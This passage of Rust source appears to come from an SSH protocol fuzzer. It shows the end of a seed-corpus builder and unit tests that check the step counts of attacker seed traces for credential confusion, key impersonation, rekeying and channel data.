            // NewKeys, then non-KEX traffic. Single-PUT (drives each stack's rekey
            // state machine); the confirmed-correct behaviour was validated with a
            // fresh-build TCP reproducer (wolfssh-repro/rekey_repro.py).
            (
                seed_client_attacker_kexinit_injection(server),
                "seed_client_attacker_kexinit_injection",
            ),
        ]);
    }

    corpus
}

#[cfg(test)]
mod tests {
    use super::*;

    // The credential-confusion seeds must build without panicking and carry the
    // full publickey handshake (9 steps: output + banner + kexinit + ecdh +
    // newkeys + svc_req + auth_req + chan_open + chan_req). Type-correctness is
    // enforced by the term! macro at compile time; this guards the shape.
    #[test]
    fn credential_confusion_seeds_build() {
        let client = AgentName::first();
        let server = client.next();
        for (trace, name) in [
            (seed_client_attacker_pubkey_b(server), "pubkey_b"),
            (
                seed_client_attacker_impersonate_a_with_b(server),
                "impersonate_a_with_b",
            ),
            (
                seed_client_attacker_unauthorized_key_c(server),
                "unauthorized_key_c",
            ),
        ] {
            assert_eq!(trace.steps.len(), 9, "seed {name} step count");
            assert_eq!(trace.descriptors.len(), 1, "seed {name} descriptor count");
        }
    }

    // The rekey seed keeps its 10-step re-KEX shape after the mutable-KEXINIT
    // enrichment, and the channel-data seed keeps its 13 steps.
    #[test]
    fn enriched_seeds_shape() {
        let client = AgentName::first();
        let server = client.next();
        assert_eq!(seed_client_attacker_rekey(server).steps.len(), 10);
        assert_eq!(seed_client_attacker_channel_data(server).steps.len(), 13);
    }
}
